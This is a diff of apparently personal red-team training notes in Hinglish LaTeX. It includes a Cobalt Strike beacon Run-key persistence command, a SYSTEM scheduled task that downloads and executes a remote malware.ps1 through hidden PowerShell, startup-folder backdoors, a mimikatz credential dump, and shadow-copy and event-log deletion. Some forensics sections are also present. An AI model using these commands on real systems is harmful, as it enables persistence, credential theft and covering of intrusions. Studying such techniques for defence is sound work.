+        \textbackslash Windows\textbackslash CurrentVersion\textbackslash Run) string values store karte hain jo executables ke paths point karte hain. Jab user logs in, Windows inko load karta hai. Cobalt Strike mein, tu beacon payload generate karta hai, usko target pe place karta hai, phir registry mein entry daal deta hai taaki auto-start ho. Yeh user-level (HKCU – current user) ya system-level (HKLM – all users) ho sakta hai.[4][1][2]
 
         \item \textcolor{red}{\textbf{Note:}} Red Teamer Perspective: Hum isko love karte hain kyunki simple, reliable, aur native hai – no extra tools chahiye, aur detection low agar payload obfuscated ho. Profit? Long-term C2 access, even reboots ke baad.[1][4]
 
@@ -4359,8 +4507,12 @@ $instance = Get-WmiObject ...; $instance.Delete()
               \begin{itemize}
                 \item Command:
                   \begin{tcolorbox}[codebox]
-                    reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v MyUpdate /t REG_SZ /d "C:\Temp\beacon.exe" /f
-                  \end{tcolorbox}
+reg add HKCU\textbackslash{}Software\textbackslash{}Microsoft\textbackslash{}Windows\textbackslash{}CurrentVersion\textbackslash{}Run 
+/v MyUpdate 
+/t REG\_SZ 
+/d "C:\textbackslash{}Temp\textbackslash{}beacon.exe" 
+/f
+\end{tcolorbox}
                   – yeh ``MyUpdate'' naam ki entry banaata hai jo beacon.exe ko run karega.
                 \item Breakdown: /v value name (disguised), /t type (string), /d path to payload, /f force without prompt.
               \end{itemize}
@@ -4393,7 +4545,8 @@ $instance = Get-WmiObject ...; $instance.Delete()
       \begin{enumerate}[leftmargin=*]
         \item Startup folder Windows ka built-in feature hai jo programs ko allow karta hai ki woh user login ya system boot par automatically start ho jaayein. Yeh OS ke core part hai, jahaan shortcuts (.lnk files) ya executables daal do, toh woh run ho jaate hain. Location do types ke hote hain:
           \begin{itemize}
-            \item Per-User Startup Folder: C:\textbackslash Users\textbackslash<Username>\textbackslash AppData\textbackslash Roaming\textbackslash Microsoft\textbackslash Windows\textbackslash Start Menu\textbackslash Programs\textbackslash Startup (tune jo diya, yeh sahi hai – user-specific, sirf us user ke login par run hota hai).
+            \item Per-User Startup Folder: C:\textbackslash Users\textbackslash<Username>\textbackslash AppData\textbackslash Roaming\textbackslash \\
+            Microsoft\textbackslash Windows\textbackslash Start Menu\textbackslash Programs\textbackslash Startup (tune jo diya, yeh sahi hai – user-specific, sirf us user ke login par run hota hai).
             \item All-Users Startup Folder: C:\textbackslash ProgramData\textbackslash Microsoft\textbackslash Windows\textbackslash Start Menu\textbackslash Programs\textbackslash Startup (sab users ke liye, system-wide run hota hai).
           \end{itemize}
 
@@ -4416,7 +4569,12 @@ $instance = Get-WmiObject ...; $instance.Delete()
         \item How to Do This Attack Step-by-Step (As Done by Red Teamers):
           \begin{enumerate}
             \item Initial Access Le Lo: Pehle target machine mein entry karo (e.g., phishing se shell).
-            \item Startup Folder Locate Karo: Path confirm karo – per-user: C:\textbackslash Users\textbackslash<Username>\textbackslash AppData\textbackslash Roaming\textbackslash Microsoft\textbackslash Windows\textbackslash Start Menu\textbackslash Programs\textbackslash Startup (hidden hota hai, File Explorer mein ``Show hidden files'' on karo). All-users ke liye admin access chahiye: C:\textbackslash ProgramData\textbackslash Microsoft\textbackslash Windows\textbackslash Start Menu\textbackslash Programs\textbackslash Startup.
+            \item Startup Folder Locate Karo: Path confirm karo – per-user: C:\textbackslash Users \\
+            \textbackslash<Username>\textbackslash AppData\textbackslash Roaming\textbackslash Microsoft\textbackslash Windows\textbackslash Start Menu\textbackslash Programs\
+            \\
+            textbackslash Startup (hidden hota hai, File Explorer mein ``Show hidden files'' on karo). All-users ke liye admin access chahiye: C:\textbackslash ProgramData\textbackslash Microsoft\
+            \\
+            textbackslash Windows\textbackslash Start Menu\textbackslash Programs\textbackslash Startup.
             \item Malicious File Banao ya Upload Karo: Ek executable ya shortcut banao jo run hone pe malicious action kare (e.g., reverse shell).
             \item File ko Folder Mein Place Karo: Copy/move karo startup path pe – ab yeh auto-run hoga.
             \item Permissions Set Karo (If Needed):
@@ -4500,7 +4658,8 @@ $instance = Get-WmiObject ...; $instance.Delete()
 
         \item Your Commands Ka Full Breakdown (What It Is, Where/When to Use, and All Explained):
           \begin{enumerate}
-            \item \texttt{schtasks /create /ru system /sc onlogon /tn "ajay" /tr "c:/windows/system32/notepad.exe"}
+            \item \texttt{schtasks /create /ru system /sc onlogon /tn "ajay" /tr "c:/windows \\
+            /system32/notepad.exe"}
               \begin{itemize}
                 \item What It Is: Yeh command ek task create karta hai named ``ajay'' jo har user logon par Notepad.exe run karega SYSTEM privileges se.
                 \item Flags Breakdown: /ru system (run as SYSTEM – high priv), /sc onlogon (trigger: user login par), /tn ``ajay'' (task name), /tr ``path'' (run command).
@@ -4508,7 +4667,9 @@ $instance = Get-WmiObject ...; $instance.Delete()
                 \item When to Use: Persistence ke liye jab tu logon-based trigger chahiye (e.g., user login hone pe backdoor activate).
                 \item \textcolor{red}{\textbf{Note:}} Red Team Example: /tr ko malware path se replace karo – logon par backdoor run hoga.
               \end{itemize}
-            \item \texttt{schtasks /create /tn "task name" /tr "c:/windows/syswow64/windowspowershell/v1.0/powershell.exe -windowstyle hidden -nologo -noninteractive -ep bypass -nop -c IEX (new-object net.webclient).downloadString('http://192.168.235/malware.ps1')" /sc onlogon /ru system}
+            \item \texttt{schtasks /create /tn "task name" /tr "c:/windows/syswow64 \\
+            /windowspowershell/v1.0/powershell.exe -windowstyle hidden -nologo -noninteractive -ep bypass -nop -c IEX (new-object net.webclient) \\
+            .downloadString('http://192.168.235/malware.ps1')" /sc onlogon /ru system}
               \begin{itemize}
                 \item What It Is: Task create karta hai jo logon par hidden PowerShell script download aur run karega SYSTEM se (bypass execution policy).
                 \item Flags Breakdown: /tn ``task name'' (name), /tr ``long command'' (PowerShell to download/run script), /sc onlogon (logon trigger), /ru system (high priv).
@@ -4516,7 +4677,8 @@ $instance = Get-WmiObject ...; $instance.Delete()
                 \item When to Use: Advanced persistence – logon par fresh malware pull karo (dynamic, AV bypass).
                 \item \textcolor{red}{\textbf{Note:}} Red Team Example: URL ko attacker C2 se link karo – logon par shell milega.
               \end{itemize}
-            \item \texttt{schtasks /create /sc minute /mo 1 /tn 'task name' /tr "c:/windows/system32/notepad.exe"}
+            \item \texttt{schtasks /create /sc minute /mo 1 /tn 'task name' /tr "c:/windows/ \\
+            system32/notepad.exe"}
               \begin{itemize}
                 \item What It Is: Task create karta hai jo har 1 minute Notepad run karega.
                 \item Flags Breakdown: /sc minute (minute interval), /mo 1 (every 1 min), /tn 'task name' (name), /tr ``path'' (command).
@@ -4782,16 +4944,7 @@ $instance = Get-WmiObject ...; $instance.Delete()
       \noindent\rule{\textwidth}{0.4pt}
       \texttt{=============================================================}
 
-      \documentclass[a4paper,12pt]{article}
-      \usepackage[utf8]{inputenc}
-      \usepackage[T1]{fontenc}
-      \usepackage{geometry}
-      \geometry{a4paper, margin=1in}
-      \usepackage{xcolor}
-      \usepackage{enumitem}
-      \usepackage{tcolorbox}
-      \tcbuselibrary{listings}
-      \usepackage{noto}
+   
 
       \definecolor{codebg}{RGB}{245,245,245}
       \definecolor{codeborder}{RGB}{200,200,200}
@@ -6050,13 +6203,7 @@ sekurlsa::logonPasswords
 
       \noindent =============================================================
 
-      \documentclass{article}
-      \usepackage[a4paper, margin=1in]{geometry}
-      \usepackage{xcolor}
-      \usepackage{tcolorbox}
-      \usepackage{listings}
-      \usepackage{enumitem}
-      \usepackage{longtable}
+      
 
       \lstset{
         language={},
@@ -6716,7 +6863,7 @@ net localgroup "Remote Desktop Users" <username> /add
 
       \begin{enumerate}[itemsep=1em, resume]
         \item Bro, yeh sab commands red team ke lateral movement arsenal mein important hai. Practice kar, samajh ke use kar, aur agar aur details chahiye toh baata!
-        \item Stay sharp and keep hacking! 😎
+        \item Stay sharp and keep hacking! ��
       \end{enumerate}
 
       \textcolor{blue}{\huge\bfseries Topic--RDP Enable via Registry}
@@ -6772,7 +6919,7 @@ netsh advfirewall firewall set rule group="windows management instrumentation (w
       \end{longtable}
 
       \begin{enumerate}[itemsep=1em, resume]
-        \item Bro, yeh puri clarity thi RDP enablement aur firewall configuration ki as a red teamer. Lab mein try kar, doubt aaye comment karna. Keep hacking! 😎
+        \item Bro, yeh puri clarity thi RDP enablement aur firewall configuration ki as a red teamer. Lab mein try kar, doubt aaye comment karna. Keep hacking! ��
       \end{enumerate}
 
       \textcolor{blue}{\huge\bfseries Topic--System Firewall Modify kar ke RDP Connections Allow Karna}
@@ -6860,7 +7007,7 @@ netsh advfirewall firewall set rule group="remote desktop" new enable=yes
 
       \begin{enumerate}[itemsep=1em, resume]
         \item Bro, ye thi tujhe \textbf{RDP port ka firewall se open karne ki method} red team ke viewpoint se, stepwise aur badi saaf safaai se. Lab pe kar ke dekh aur agar aur detail ya dusra topic chahiye toh bolna.
-        \item Stay sharp! 😎
+        \item Stay sharp! ��
       \end{enumerate}
 
       \textcolor{blue}{\huge\bfseries Topic--Lateral Movement through Impacket}
@@ -7102,7 +7249,7 @@ reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v "Backup" /t REG_SZ
 
       \begin{enumerate}[itemsep=1em, resume]
         \item Bro, yeh tha tera complete \textbf{Exfiltration ka execution plan using rclone} — red team ki nazar se. Lab mein fully test kar, safely practice kar. Aur koi help chahiye toh batana.
-        \item Keep grinding! 😎
+        \item Keep grinding! ��
         \item References: Various pentesting blogs, official rclone docs, red team toolkits
       \end{enumerate}
 
@@ -7148,7 +7295,7 @@ reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v "Backup" /t REG_SZ
       \begin{enumerate}[itemsep=1em, resume]
         \item Bro, ye tha tera \textbf{Third Party Cloud Sync Tools se Data Exfiltration ka pura funda} — kaise setup karna, use karna aur red team mein exploit karna.
         \item Lab mein try kar, aur full stealth techniques add kar. Agar koi question ho toh push dena!
-        \item Keep grinding, champion! 😎
+        \item Keep grinding, champion! ��
       \end{enumerate}
 
       \noindent =============================================================
@@ -7295,7 +7442,7 @@ vssadmin list shadows
 
       \begin{enumerate}[itemsep=1em, resume]
         \item Bro, yeh poori story hai \textbf{shadow copies ka aur unke cleanup ka} red team view se, taaki attacker apni trail chhupa ke poora impact de. Lab me try kar, aur koi bhi doubts ho toh ping kar.
-        \item Stay alert, stay dangerous! 😎
+        \item Stay alert, stay dangerous! ��
       \end{enumerate}
 
       \textcolor{blue}{\huge\bfseries Topic--Modifying Boot Status Policies}
@@ -7385,7 +7532,7 @@ shutdown /r /t 0
 
       \begin{enumerate}[itemsep=1em, resume]
         \item Bro, yeh tha tera \textbf{Boot Status Policies modification ka practical overview} red team point of view se. Practice kar, samajh ja, aur agar aur koi sawal ho to bata dena.
-        \item Stay lethal, stay learning! 😎
+        \item Stay lethal, stay learning! ��
       \end{enumerate}
 
       \noindent =============================================================
@@ -7490,7 +7637,7 @@ wevutil.exe cl application
 
       \begin{enumerate}[itemsep=1em, resume]
         \item Bro, yeh tha tera complete \textbf{event logs deletion ka funda using wevutil.exe}, red team point of view se. Practice in controlled lab, aur agar aur details chahiye toh bolio.
-        \item Stay stealthy, stay lethal! 😎
+        \item Stay stealthy, stay lethal! ��
       \end{enumerate}
 
       \textcolor{blue}{\huge\bfseries Topic--Incident Response (IR) Plan for Ransomware Attack}
@@ -7542,7 +7689,7 @@ wevutil.exe cl application
 
       \begin{enumerate}[itemsep=1em, resume]
         \item Bro, ye tera \textbf{ransomware attack IR plan} ka detailed walkthrough tha, red team awareness ke sath. Lab mein simulate kar, apne process setup kar, aur koi questions ho toh batana!
-        \item Stay smart, stay safe! 😎
+        \item Stay smart, stay safe! ��
       \end{enumerate}
 
       \textcolor{blue}{\huge\bfseries Topic--Blue Team Operation Investigation using Windows Event Logs}
@@ -7612,7 +7759,7 @@ C:\Windows\System32\winevt\Logs\
 
       \begin{enumerate}[itemsep=1em, resume]
         \item Bro, ab event logs ke importance, unka use, IP tracing aur event numbers samajh aa gaya. Lab mein practice kar Event Viewer se ya EventLogXP jaise tools ke zariye logs ko analyze karna start kar. Aur koi help chaiye toh bol dena!
-        \item Stay vigilant, stay unbeatable! 😎
+        \item Stay vigilant, stay unbeatable! ��
       \end{enumerate}
 
       \noindent =============================================================
@@ -7744,7 +7891,7 @@ schtasks /query /tn "UpdaterTask"
 
       \begin{enumerate}[itemsep=1em, resume]
         \item Bro, ye tha tera \textbf{scheduled task creation aur uske event monitoring} ka pura funda red team perspective se. Lab me create karke event check kar, phir aur deep jaana. Koi questions ho toh bol!
-        \item Stay sharp and keep hacking! 😎
+        \item Stay sharp and keep hacking! ��
       \end{enumerate}
 
       \noindent =============================================================
@@ -7840,7 +7987,7 @@ schtasks /query /tn "UpdaterTask"
 
       \begin{enumerate}[itemsep=1em, resume]
         \item Bro, ye thi teri \textbf{SMB aur RDP activity ki investigation ki puri kahani}, dono team ke nazariye se. Lab me practice kar aur event logs ko achhe se samajh. Kuch doubt ho toh push dena!
-        \item Keep learning, keep hustling! 😎
+        \item Keep learning, keep hustling! ��
       \end{enumerate}
 
       \textcolor{blue}{\huge\bfseries Topic--SMB aur RDP Activity Investigation}
@@ -7902,7 +8049,7 @@ schtasks /query /tn "UpdaterTask"
 
       \begin{enumerate}[itemsep=1em, resume]
         \item Bro, ye thi teri \textbf{SMB aur RDP activity ki investigation ki puri kahani}, dono team ke nazariye se. Lab me practice kar aur event logs ko achhe se samajh. Kuch doubt ho toh push dena!
-        \item Keep learning, keep hustling! 😎
+        \item Keep learning, keep hustling! ��
       \end{enumerate}
 
       \textcolor{blue}{\huge\bfseries Topic--SRUM Data}
@@ -7954,7 +8101,7 @@ C:\Windows\System32\sru\
 
       \begin{enumerate}[itemsep=1em, resume]
         \item Bro ye tha tera \textbf{SRUM data and related tools ka pura funda} — system resource usage monitoring se forensic investigation tak. Lab me SRUMECMD try kar aur Timeline Explorer explore kar. Agar aur depth mein chahiye toh bol dedena!
-        \item Stay sharp, stay learning! 😎
+        \item Stay sharp, stay learning! ��
       \end{enumerate}
 
       \textcolor{blue}{\huge\bfseries Topic--Browser History Investigation}
@@ -8007,8 +8154,10 @@ copy "C:\Users\<username>\AppData\Local\Google\Chrome\User Data\Default\History"
 
       \begin{enumerate}[itemsep=1em, resume]
         \item Bro, ab toh full clear ho gaya hoga kaise browser history extract karte hain, DB Browser ka use karte hain, aur red team isse apne analysis mein kaise lagata hai. Lab pe try kar, aur agar aur deep query chahiye toh bata dena!
-        \item Keep smashing it! 😎
+        \item Keep smashing it! ��
       \end{enumerate}
+
+     
 
       \noindent =============================================================
 
